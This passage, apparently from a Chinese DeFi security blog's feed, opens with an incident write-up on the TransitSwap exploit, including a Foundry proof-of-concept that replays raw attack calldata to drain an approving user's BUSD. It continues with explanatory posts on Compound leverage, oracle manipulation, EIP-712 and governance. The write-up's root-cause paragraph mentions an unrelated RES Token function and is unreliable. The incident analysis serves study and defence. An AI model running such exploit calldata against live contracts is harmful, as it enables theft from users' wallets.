rel="noopener">https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189</a></p><p>Debug transaction：<a href="https://phalcon.blocksec.com/tx/bsc/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189" target="_blank" rel="noopener">https://phalcon.blocksec.com/tx/bsc/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189</a></p><h2 id="攻击复现-1"><a href="#攻击复现-1" class="headerlink" title="攻击复现"></a>攻击复现</h2><p>模拟的攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std&#x2F;Test.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;interface.sol&quot;;</span><br><span class="line">&#x2F;*</span><br><span class="line">    Attack tx: https:&#x2F;&#x2F;bscscan.com&#x2F;tx&#x2F;0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189</span><br><span class="line">    Attack eventlog: https:&#x2F;&#x2F;bscscan.com&#x2F;tx&#x2F;0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189#eventlog</span><br><span class="line">    Debug transaction: https:&#x2F;&#x2F;phalcon.blocksec.com&#x2F;tx&#x2F;bsc&#x2F;0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189</span><br><span class="line">    </span><br><span class="line">    Attack steps: It&#39;s simple, but you need to study past transactions to know how to combine the call data.</span><br><span class="line">    1.Incorrect owner address validation, you can input any innocent user who granted approvals to &quot;0xed1afc8c4604958c2f38a3408fa63b32e737c428&quot; before.</span><br><span class="line">    in this case 0x1aae0303f795b6fcb185ea9526aa0549963319fc is a innocent user who has BUSD and granted approvals.</span><br><span class="line">    </span><br><span class="line">    2.</span><br><span class="line">    Contract &quot;0xed1afc8c4604958c2f38a3408fa63b32e737c428&quot; will perform transferFrom to transfer amount of innocent user to attacker.</span><br><span class="line">    That&#39;s it.</span><br><span class="line"></span><br><span class="line">    Root cause: Incorrect owner address validation. </span><br><span class="line"></span><br><span class="line">    Contract:</span><br><span class="line">    TransitSwap:0x8785bb8deae13783b24d7afe250d42ea7d7e9d72</span><br><span class="line">    Bridge:0x0B47275E0Fe7D5054373778960c99FD24F59ff52</span><br><span class="line">    Claimtokens:0xed1afc8c4604958c2f38a3408fa63b32e737c428   </span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    address TransitSwap &#x3D;  0x8785bb8deAE13783b24D7aFE250d42eA7D7e9d72;</span><br><span class="line">    IERC20 busd &#x3D; IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 21816545); &#x2F;&#x2F; fork mainnet block number 21816545</span><br><span class="line">        &#x2F;&#x2F; vm.createSelectFork(&quot;bsc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   function testExploit() public &#123; </span><br><span class="line"></span><br><span class="line">    emit log_named_decimal_uint(&quot;Before exploiting, Attacker BUSD balance&quot;,busd.balanceOf(address(this)), 18);</span><br><span class="line"></span><br><span class="line">    TransitSwap.call(hex&quot;006de4df0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f8000000000000000000000000a1137fe0cc191c11859c1d6fb81ae343d70cc17100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002707f79951b87b5400000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000380000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000ed1afc8c4604958c2f38a3408fa63b32e737c4280000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000007616e64726f69640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a40a5ea46600000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000001aae0303f795b6fcb185ea9526aa0549963319fc000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e8400000000000000000000000000000000000000000000015638842fa55808c0af00000000000000000000000000000000000000000000000000000000000077c800000000000000000000000000000000000000000000000000000000&quot;);</span><br><span class="line"></span><br><span class="line">    emit log_named_decimal_uint(&quot;After exploiting, Attacker BUSD balance&quot;,busd.balanceOf(address(this)), 18);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在RES Token的底层<code>_transfer</code>函数中调用了计算奖励的函数<code>_thisAToB()</code>，但此函数在<code>burn</code>之前没有对owner进行验证，导致我们可以输入任意一个被授权的地址。</p><h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><p>很简单，但是需要研究过往的交易，才能知道如何组合通话数据。<br>1.不正确的所有者地址验证，您可以输入之前授予批准“0xed1afc8c4604958c2f38a3408fa63b32e737c428”的任何无辜用户。<br>在这种情况下，0x1aae0303f795b6fcb185ea9526aa0549963319fc 是拥有 BUSD 并获得批准的无辜用户。</p><p>2.<br>合约“0xed1afc8c4604958c2f38a3408fa63b32e737c428”将执行transferFrom，将无辜用户的金额转移给攻击者。<br>而已。</p>]]></content>
      
      
      <categories>
          
          <category> 攻击事件追踪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击事件追踪 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compound系列（3）</title>
      <link href="/Compound-more/"/>
      <url>/Compound-more/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="Compound系列（3）-More"><a href="#Compound系列（3）-More" class="headerlink" title="Compound系列（3） More"></a>Compound系列（3） More</h1><h2 id="杠杆交易"><a href="#杠杆交易" class="headerlink" title="杠杆交易"></a>杠杆交易</h2><p>目前，借贷市场的强需求之一就是为了杠杆交易。但是，将 A 资产抵押到 Compound 再借出 B 资产，之后再到 DEX 平台（如 Uniswap）用 B 资产兑换成 A 资产，又重复投入 Compound，如此反复操作，对用户来说，是非常繁琐的，而且中间多次操作会消耗较多手续费。因此，直接提供杠杆交易服务的产品很受欢迎。</p><p>从用户需求层面来说，用户想要的就是做多或做空某种资产。比如，选定 ETH/USDT 交易对，开多的时候，就需要借入 USDT 并兑换成 ETH；开空的时候，则借入 ETH 来兑换 USDT。</p><p>当然，用户想要开仓，就需要先抵押资产作为<strong>保证金</strong>，这样才可借入资产。该逻辑其实和 Compound 的借贷逻辑一样，不同点在于，Compound 属于超额抵押借贷，存入价值 100 美刀的资产，最多只可借出 75 美刀的资产；但杠杆交易则可以借出多倍的资产，比如开 3 倍杠杆时，100 美刀的抵押资产，可以借出 300 美刀的资产来开仓。</p><p>这时，大部分人会想到的一个问题就是：抵押 100 美刀，借出 300 美刀，那多出的 200 美刀从哪来呢？这个问题的本质其实是：<strong>资金池里的资产从哪来？</strong></p><p>Compound 的资金池只有一种流入途径，那就是用户的存款。但杠杆交易的资金池，其实有两种流入途径，一是用户的存款，二是<strong>开仓后兑换所得的资产</strong>。<strong>第二种途径很重要，这是维持资金池流动性很关键的一点。</strong> 比如，当用户抵押了 100 美刀的 ETH，开仓时借出了 300 美刀的 USDT，兑换回来了 300 美刀的 ETH，这 300 美刀的 ETH 又流回到资金池里去，因此，资金池的总价值其实没有变化，只是同价值的 A 资产变成了 B 资产。如果兑换后的资产不流回资金池，那资金池很容易就会失衡，导致资金池的流动性不足，甚至枯竭。</p><p>多空平衡的情况下，资金池的流动性也会保持平衡。但是，如果出现极端情况，比如，多方远超于空方的时候，就要考虑是否会出现某一资金池枯竭的风险。多方抵押了 ETH，借出了 USDT，兑换回 ETH，随着多方的力量越来越强，那么 ETH 的资金池会越来越多，但 USDT 的资金池则越来越少，那 USDT 的资金池是否就会面临枯竭的风险呢？这种问题，其实在 Compound 中也同样存在，而 Compound 的机制中，<strong>降低这种风险的关键点在于利率模型，即资金使用率超过拐点后的利率会非常高，借款利率高涨就会使得用户借款的意愿减低，而存款利率高涨就会促进用户多存款，从而可以让资金池的供需关系又回到一个平衡的位置。</strong></p><p>对用户来说，杠杆交易的风险，和中心化的一样，就是<strong>存在爆仓的风险</strong>。抵押资产的价格变化、借款资产的价格变化、兑换资产的价格变化，以及借款利息的不断增长，都有可能导致爆仓。</p><p>借出的资产+利息称为<strong>债务</strong>，兑换回来的资产称为<strong>头寸</strong>，那对于每个持仓单，盈亏的计算公式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">盈亏 &#x3D; 头寸价值 - 债务价值</span><br></pre></td></tr></table></figure><p>盈亏为正时，表示盈利，那就不会有爆仓的风险。但是，盈亏为负时，就表示亏损了，一旦亏损率（亏损/保证金价值）超过某个阈值时（比如 80%），就需要强制平仓了，即是爆仓，也称为清算。为了避免爆仓，用户可以通过还款降低债务，或追加保证金。</p><p>如果用户自己想要止盈或止损了，就可以自己手动平仓了，平仓的逻辑也比较简单，将头寸资产再兑换回所借资产，接着还掉债务。如果兑换回来的资产不足以还债的话，那可能需要用部分抵押资产来兑换成所借资产并还债。</p><h2 id="杠杆挖矿"><a href="#杠杆挖矿" class="headerlink" title="杠杆挖矿"></a>杠杆挖矿</h2><p>自从 2020 年 6月 Compound 开启<strong>流动性挖矿</strong>（Yield Farming）以来，这一产业就迅速风靡，很多玩家都当起「农民」，通过为各种 DeFi 产品提供流动性来获得收益，收益一般为治理代币或交易费，或两者都有。比如，在 Compound 存款和借款都能挖到其治理代币 <strong>COMP</strong>；在 Uniswap 投入流动性得到 <strong>LP Token</strong> 可挖矿手续费；在 Uniswap 质押 <strong>LP Token</strong> 能挖到 <strong>UNI</strong> 代币和手续费。LP Token 本质上就类似于 cToken，不同交易对池子有不同的 LP Token。</p><p>杠杆挖矿则是将用户本金加杠杆，达到放大本金的效果，从而为用户提高挖矿的效率。目前大部分杠杆挖矿产品主要都是投入到如 Uniswap、SushiSwap、PancakeSwap 等 DEX 平台进行挖矿。</p><p>以 <strong>Alpha Homora</strong> 为例，矿池可分为两大类，一类称为 <strong>liquidity providing pools</strong>，另一类称为 <strong>yield farming pools</strong>。 <strong>liquidity providing pools</strong> 只是投入流动性到 DEX 平台得到 LP Token，从而赚取 DEX 平台的手续费和 Alpha 代币；而 <strong>yield farming pools</strong> 则会将 LP Token 质押到 DEX 平台，从而，除了赚取 DEX 平台的手续费和 Alpha 代币，还能赚到 DEX 的平台代币。两者的主要区别就在于是否将 LP Token 进行质押。</p><p>而用户要参与杠杆挖矿，首先选定要参与的一个池子，比如选定 <strong>Uniswap 的 UNI/ETH</strong> 池子。之后，用户需要投入本金，本金可以是 <strong>UNI、ETH</strong> 或这个交易对的 <strong>LP Token</strong>，可以投入这三种 Token 中的一种或多种。接着，用户就可以选定杠杆倍数和想要借的币种和数量，本金和杠杆倍数决定了最多可以借多少，借款币种可以是 UNI 和 ETH 中的一种或两种，一般只借一种。最后，用户再次确定各种数据，没问题就可以提交开仓了。开仓时，智能合约就会根据 Uniswap 上该池子的兑换率自动将部分资产兑换成另一种，让两种资产的数量能满足添加流动性的匹配要求，然后就投入到 Uniswap UNI/ETH 的资金池里，得到该池子的 LP Token。如果用户选择的是 <strong>liquidity providing pool</strong>，那流程到此就算完成了；如果用户选择的是 <strong>yield farming pool</strong>，那还会自动将 LP Token 质押到 Uniswap。</p><p>其他杠杆挖矿产品的逻辑也是大同小异，较大的不同在于其他杠杆挖矿产品大多只有 <strong>yield farming pools</strong>，并没有 <strong>liquidity providing pools</strong>。</p><p>那么，杠杆挖矿的风险又如何呢？</p><p>首先，在没杠杆的情况下，用户往 AMM 模式的 DEX 提供流动性时，参与挖矿的两个币种一旦出现汇率变化，就会产生<strong>无常损失</strong>（Impermanent loss，也称“非永久性损失”），价格波动越大，无常损失越大；而加了杠杆之后，放大了本金，也同样放大了无常损失。通常，无常损失需要靠手续费分成和质押 LP Token 的收益所得来填补。所以，用户平仓时，如果已经赚取的收益不能覆盖无常损失，那用户其实就是亏损的。当然，这还没算上借贷的利息。</p><p>另外，用户进行杠杆挖矿，还存在被清算的风险。借贷资产+利息就是债务，LP Token 的价值就是头寸，当债务比率（债务/头寸）达到清算线时，就会进行清算。为了避免清算，用户可以通过还款降低债务，或追加 LP Token 增加头寸。</p><p>杠杆挖矿最大的风险应该是<strong>资金池枯竭</strong>的风险，因为用户投入的本金和借贷的资产全都流入到 DEX 平台了，只有等到平仓后资产才会重新流回资金池。那么，如果没有足够的存款支撑，就难以维系下去。因此，需要大力吸引用户来存款，利率会远比 Compound、Aave 等借贷平台高得多，且通常采用三级利率模型，才可以较好地均衡资金池的资金使用率。比如，Alpaca（羊驼）的利率模型如下：</p><ul><li>资金使用率 0% - 50% 时，利率 = 0.4 × 资金使用率</li><li>资金使用率 50% - 90% 时，利率 = 20%（恒定）</li><li>资金使用率 90% - 100% 时，利率 = 13 × 资金使用率 - 11.5</li></ul><h2 id="操纵预言机攻击"><a href="#操纵预言机攻击" class="headerlink" title="操纵预言机攻击"></a>操纵预言机攻击</h2><p><strong>操控预言机所依赖的信息源进行短时间的价格操纵以达成误导链上价格是典型的预言机攻击，其本质是对预言机进行操控，造成内外价格差并利用闪电贷等新型金融工具从中套利。</strong></p><p><strong>Compound</strong> 曾在 2020 年 11 月 26 日遭受过价格预言机操纵攻击，导致价值高达八千多万美元的加密资产被系统强制清算。</p><p>因为 Compound 使用的是自己设计研发的预言机系统 <a href="https://compound.finance/prices" target="_blank" rel="noopener">Open Price Feed</a>，且使用的价格数据只依赖 <em>Coinbase</em> 这个中心化的交易所来提供。而当日下午，Coinbase 交易所稳定币 DAI 价格出现剧烈波动，一度暴涨超 30% 至 1.34 美元，后又快速回落。这一剧烈波动，就让很多借贷了 DAI 的用户资产触发了清算。</p><p>事实上，除了 Compound，Harvest Finance、Value DeFi、Cheese Bank、Origin Protocol 等都先后遭到类似预言机的攻击，MakerDAO 和 Aave 历史上也都因此发生过大规模清算。</p><p>针对此类攻击，安全建议如下：</p><ol><li>接入 Chainlink 等完善的第三方价格预言机对所有代币价格提供实时价格数据</li><li>在智能合约内部建立细致的价格监控程序，对任何可能产生巨大波动的交易进行管制或者阻止</li></ol><p>目前第三方价格预言机主要有：<strong>Chainlink、NEST、Band、DOS、Tellor、MakerDao</strong> 等。其中，龙头当属 Chainlink 了。Chainlink 使用<strong>链上聚合模式</strong>，节点将数据提交到链上合约，在合约内进行数据聚合，获得最终数据。</p><p>另外，随着 DEX 的发展，直接使用 DEX 的链上价格做为预言机也是一个很有潜力的方向，这需要 DEX 具有足够的深度，能够抵抗价格操纵，或者对价格进行加权等操作，来规避价格操纵攻击。这块目前应用最广泛的就是 <a href="https://uniswap.org/docs/v2/core-concepts/oracles/" target="_blank" rel="noopener">Uniswap TWAP</a>（Time-Weighted Average Price），即<strong>时间加权平均价格</strong>，可通过查看官方文档了解其机制：</p><ul><li><a href="https://uniswap.org/docs/v2/core-concepts/oracles/" target="_blank" rel="noopener">https://uniswap.org/docs/v2/core-concepts/oracles/</a></li></ul><p>如果还需要再进一步提高安全性，可以选择多个预言机进行加权平均计算，推荐 3 家第三方预言机 + 3 家 DEX 组合，比如选择 <strong>Chainlink、NEST、Band、Uniswap、SushiSwap、Bancor</strong>，每家可设置不同的权重值，计算时，获取到六家价格后，去掉最高价和最低价，剩下的再进行加权平均计算作为最后的实际价格。另外，在同个区块内，也无需每次交易都计算出实时价格，只要计算出一个合理价格后，整个区块内的交易都可直接使用该价格，这样，利用闪电贷操纵价格的手段也造不成威胁了。</p><h2 id="EIP712"><a href="#EIP712" class="headerlink" title="EIP712"></a>EIP712</h2><h4 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h4><p>这个EIP旨在提高链下消息签名对链上的可用性。我们可以看到，因为节省gas以及减少链上交易的原因，采用链下消息签名的需求日益增长。现在已经被签名的消息，展示给用户的是一串难以理解的16进制的字符串，附带一些组成这个消息的项目的上下文。</p><p><a href="https://eips.ethereum.org/EIPS/eip-712" target="_blank" rel="noopener">EIP-712: Typed structured data hashing and signing (ethereum.org)</a></p><p>在使用EIP712之前的签名信息：</p><p><img src="EIP712_before.png" alt=""></p><p>在使用EIP712之后的签名信息：</p><p><img src="EIP712_after.png" alt=""></p><h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><p>下面我们以一个拍卖场景为例，看看如何在产品中把 EIP712 用起来。</p><h5 id="定义数据结构"><a href="#定义数据结构" class="headerlink" title="定义数据结构"></a>定义数据结构</h5><p>首先，用 JSON 格式列出用户所要签名的数据。 比如作为一个拍卖应用，需要签名的就是下面的投标数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    amount: <span class="number">100</span>, </span><br><span class="line">    token: “<span class="number">0</span>x….”,</span><br><span class="line">    id: <span class="number">15</span>,</span><br><span class="line">    bidder: &#123;</span><br><span class="line">        userId: <span class="number">323</span>,</span><br><span class="line">        wallet: “<span class="number">0</span>x….”</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，我们可以从上面的代码片段中提炼出两个数据结构: 竞标 Bid，它包括以 <a href="https://learnblockchain.cn/2018/01/12/create_token/" target="_blank" rel="noopener">ERC20</a> 代币资产和拍卖 id 确定的出价金额，以及身份 Identity，它指定了用户 id 和 用户钱包地址。<br>下一步，将 Bid 和 Identity 定义为结构体，就可以写出下面的 solidity 合约代码了。 可以通过 EIP712 协议草案查看 EIP712 所支持的完整数据类型列表，比如地址、 bytes32、 uint256等。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bid: &#123;</span><br><span class="line">    amount: uint256, </span><br><span class="line">    bidder: Identity</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">Identity: &#123;</span><br><span class="line">    userId: uint256,</span><br><span class="line">    wallet: address</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="设计域分隔符"><a href="#设计域分隔符" class="headerlink" title="设计域分隔符"></a>设计域分隔符</h5><p>主要防止一个 DApp 的签名还能在另一个 DApp 中工作，从而导致签名冲突。拿拍卖为例子的话，一个拍卖应用里的投标请求竟然在另外一个拍卖应用里也能执行成功，可能会就导致不必要的损失。</p><p>具体来说，域分隔符就是下面这样的结构和数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name: <span class="string">"Auction dApp"</span>, <span class="comment">// DApp 的名字</span></span><br><span class="line">    version: <span class="string">"2"</span>, <span class="comment">// DApp 的版本</span></span><br><span class="line">    chainId: <span class="string">"1"</span>, <span class="comment">// [EIP-155] 定义的 chainId</span></span><br><span class="line">    verifyingContract: <span class="string">"0x1c56346..."</span>, <span class="comment">// 验签合约地址</span></span><br><span class="line">    salt: <span class="string">"0x43efba6b4..."</span> <span class="comment">// 硬编码到合约和 DApp 中的一个随机数值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用签名实现委托"><a href="#使用签名实现委托" class="headerlink" title="使用签名实现委托"></a>使用签名实现委托</h4><p>按照<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-712.md" target="_blank" rel="noopener">EIP-712</a> 规范定义的结构化数据签名方式，<a href="https://etherscan.io/address/0xc00e94cb662c3520282e6f5717214004a7f26888" target="_blank" rel="noopener">COMP代币</a>持有者可以委托给任何一个以太坊地址。任何用户只要有已签名的委托交易，都可以调用COMP智能合约中<strong>delegateBySig</strong> <a href="https://compound.finance/docs/governance#delegate-by-signature" target="_blank" rel="noopener">函数</a></p><p>这种方式的使用场景可能是，一个委托者希望联合其他COMP持有者将他们的投票委托给被委托人，并希望以非常低的成本来完成这项工作。</p><p>被委托者可以创建一个网页，让用户通过Metamask和私钥完成<strong>delegateBySig</strong> 交易，这样被委托者就能收集到签名信息。之后，被委托者可以将签名信息打包，批量一次写入到以太坊中，再执行<strong>delegateBySig</strong>函数就可以正式的收集到用户的投票权利。</p><h4 id="通过签名投票"><a href="#通过签名投票" class="headerlink" title="通过签名投票"></a>通过签名投票</h4><p><strong>delegateBySig</strong>一样，用户也可以委托第三方给 <a href="https://compound.finance/governance/proposals" target="_blank" rel="noopener">Compound治理提案</a>投票。任何用户只要有已签名的委投票交易，都可以调用智能合约中<strong>castVoteBySig</strong> <a href="https://compound.finance/docs/governance#cast-vote-by-signature" target="_blank" rel="noopener">函数</a></p><p>第三方提交用户签名交易和<strong>delegateBySig</strong>的情况是一样的，但是投票权利仅限于一个提案，并非无限制的提案。在第三方正式将投票交易发送到以太坊之前，原有的用户依然保留自主投票的权利。</p><h4 id="重放攻击注意点"><a href="#重放攻击注意点" class="headerlink" title="重放攻击注意点"></a>重放攻击注意点</h4><p>这个标准只是关于对消息签名和验证签名。在很多实际应用中，已签名的消息被用来授权一个动作，例如token交换。使用者需要确保当应用程序看到两笔一模一样的已签名消息时依然可以做出正确的行为，这一点十分重要。举个例子，重复的消息需要被拒绝，或者授权的行为应当是幂等的（注：一个幂等操作的特点是其任意多次执行所产生的影响均与一次执行的影响相同）。至于这是如何实现的，要视特定应用而定，并且超出了本标准的范围。</p><p>有关交易重放，我正打算整理一下写一篇文章</p>]]></content>
      
      
      <categories>
          
          <category> Coumpound </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Coumpound </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Compound系列（2）</title>
      <link href="/compound-government/"/>
      <url>/compound-government/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="Compound系列（2）-治理"><a href="#Compound系列（2）-治理" class="headerlink" title="Compound系列（2） 治理"></a>Compound系列（2） 治理</h1><p>我们都知道很多Defi项目都有治理机制，来看看Compound的治理有什么独特之处吧</p><p>COMP是Coumpound发行的官方代币。而COMP是一个治理代币。Compound作为一个完全去中心化的系统(或者至少是在走向它的路上)，基于COMP实现了一个去中心化的治理机制。</p><h2 id="什么是Compound治理？"><a href="#什么是Compound治理？" class="headerlink" title="什么是Compound治理？"></a>什么是Compound治理？</h2><p>Compound 协议由 COMP Token 持有者管理和升级，使用三个不同的组件； COMP Token、治理模块（Governor Alpha）和 Timelock。这些合约一起，允许社区通过 cToken 或 Comproller 的管理功能提出、投票和实时更改。提案可以包括调整利率模型，到增加对新资产的支持等改变。</p><p>任何授权超过 10 万 COMP Token 的地址都可以提出治理活动，这些活动都是可执行的代码。提案产生后，社区可以在 3 天的投票期内提交投票。如果投票获得多数、且至少 40 万票以上，就会在 Timlock 中排队，2 天后可以实施。</p><h2 id="合约"><a href="#合约" class="headerlink" title="合约"></a>合约</h2><p>现在让我们详细研究一下治理合约，包括：</p><ul><li>核心治理合约（<code>GovernorAlpha.sol</code>）</li><li>时间锁合约（<code>Timelock.sol</code>）。</li><li>和COMP代币合约本身</li></ul><h3 id="Comp-sol"><a href="#Comp-sol" class="headerlink" title="Comp.sol"></a>Comp.sol</h3><p>先从最基础的CompToken讲起吧，这其实就是一个普通的ERC-20代币，COMP合约还包括了一些相关的治理方法。</p><h4 id="delegate"><a href="#delegate" class="headerlink" title="delegate()"></a>delegate()</h4><p>用户可以将COMP的投票权委托给另外一个地址。被委托人的投票权是他自己的COMP余额+所有委托给他的COMP余额。</p><p>就像以前一样，也存在一个<code>delegateBySig</code>，用于EIP-712离线签名投票：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address delegatee</span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span></span><br></pre></td></tr></table></figure><h4 id="delegateBySig"><a href="#delegateBySig" class="headerlink" title="delegateBySig"></a>delegateBySig</h4><p>签名委托，这种方法与 Delegate 的目的相同，但它可以离线签名参与Compound 治理投票授权。有关如何创建离线签名的更多细节，请查看 <a href="https://eips.ethereum.org/EIPS/eip-712" target="_blank" rel="noopener">EIP-712</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">function</span> <span class="title">delegateBySig</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">address delegateeAddress, <span class="regexp">//</span>发送者希望委托投票的地址</span></span></span><br><span class="line"><span class="function"><span class="params">uint256 nonce, <span class="regexp">//</span> 合约状态要求与签名相匹配。这一点可以从合同的公共 nonce 映射中检索；</span></span></span><br><span class="line"><span class="function"><span class="params">uint256 expiry, <span class="regexp">//</span>签名过期时间。以 unix epoch (uint</span>) 后的秒数表示的区块时间戳；</span></span><br><span class="line"><span class="function"><span class="title">uint256</span> <span class="title">v</span>, //签名恢复字节</span></span><br><span class="line"><span class="function"><span class="title">uint256</span> <span class="title">r</span>, //<span class="title">ECDSA</span> 签名对的一部分</span></span><br><span class="line"><span class="function"><span class="title">uint256</span> <span class="title">s</span>  //<span class="title">ECDSA</span> 签名对的一部分</span></span><br><span class="line"><span class="function">);</span></span><br></pre></td></tr></table></figure><h4 id="getCurrentVotes"><a href="#getCurrentVotes" class="headerlink" title="getCurrentVotes"></a>getCurrentVotes</h4><p>获取当前投票数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCurrentVotes</span>(<span class="params">address account</span>) <span class="title">returns</span> (<span class="params">uint96</span>)</span></span><br></pre></td></tr></table></figure><ul><li>account : 检索票数的账户地址；</li><li>RETURN : 票数（整型）。</li></ul><h4 id="getPriorVotes"><a href="#getPriorVotes" class="headerlink" title="getPriorVotes()"></a>getPriorVotes()</h4><p>为了获得某个区块号下的投票权，我们可以调用getPriorVotes来检索该值。显然，这只对过去的区块号有效。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPriorVotes</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address account,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint blockNumber</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">returns</span> (<span class="params">uint96</span>)</span></span><br></pre></td></tr></table></figure><p>重要的函数就这两个，其他的相关函数大家可以自己去看<a href="https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/Comp.sol" target="_blank" rel="noopener">Comp.sol</a></p><h3 id="GovernorAlpha-sol"><a href="#GovernorAlpha-sol" class="headerlink" title="GovernorAlpha.sol"></a>GovernorAlpha.sol</h3><p>核心治理合约为<a href="https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/GovernorAlpha.sol" target="_blank" 